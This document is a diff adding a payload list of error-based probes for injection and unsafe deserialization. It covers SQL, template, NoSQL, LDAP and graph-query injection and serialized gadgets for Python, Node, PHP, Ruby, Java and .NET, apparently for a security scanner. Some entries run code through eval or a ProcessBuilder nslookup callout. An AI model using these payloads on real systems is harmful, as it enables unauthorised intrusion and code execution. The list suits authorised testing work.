@@ -1,0 +1,54 @@
+##POLYGLOT - SQLi Cross-Dialect (Error)##
+'AND 1=CONVERT(int,@@version)--/*'OR 1=extractvalue(1,concat(0x7e,version()))--*/"OR CAST(version() AS int)--
+##POLYGLOT - SSTI Cross-Engine (Error)##
+${{<%[%'"}}%\
+##POLYGLOT - NoSQL Injection (Error)##
+{"$gt":"","$ne":""}
+##LDAP Injection - Error-Based##
+*)(cn=*))(|(cn=*
+##XSLT Injection - Error-Based##
+<xsl:invalid/>
+##Elasticsearch Injection - Error-Based##
+{"query":{"invalid_query_type":{}}}
+##Cypher Injection - Error-Based##
+' OR 1=1 RETURN 7*191 //
+##CouchDB Injection - Error-Based##
+{"selector":{"$invalid_op":"test"}}
+##Python Pickle P0 - Error (1/0)##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
+##Python YAML - Error (1/0)##
+!!python/object/apply:builtins.eval ["1/0"]
+##Python jsonpickle - Error (1/0)##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["1/0"]}]}
+##Node node-serialize - Error (throw)##
+{"rce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}
+##Node js-yaml - Error (unknown tag)##
+!!invalid_tag_probe 1337
+##Node funcster - Error (invalid code)##
+{"__js":"throw new Error(1337)"}
+##PHP Unserialize - Error (nonexistent class)##
+O:9999:"NonExist":0:{}
+##Ruby YAML - Error (invalid class)##
+--- !ruby/object:NonExistentClass1337\ni: x
+##Ruby Marshal - Error (malformed)##
+BAj/AAAA
+##Perl Storable - Error (bad version)##
+cHN0MP///wQA
+##Perl YAML - Error (invalid syntax)##
+--- {{{invalid yaml 1337
+##Java Serialized - Error (HashSet header)##
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
+##SnakeYAML - Error (nonexistent class)##
+!!com.nonexistent.FakeClass1337 {}
+##Java Jackson - Error (TemplatesImpl)##
+["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}]
+##Java Fastjson - Error (TemplatesImpl)##
+{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vg=="],"_name":"a","_tfactory":{},"_outputProperties":{}}
+##Java XStream - Error (ProcessBuilder)##
+<java.lang.ProcessBuilder><command><string>nslookup</string><string>{domain}</string></command></java.lang.ProcessBuilder>
+##XMLDecoder - Error (invalid class)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>
+##.NET BinaryFormatter - Error (header probe)##
+AAEAAAD/////AQAAAAAAAAAEAQAAAA==
+##.NET ViewState - Error (probe)##
+__VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
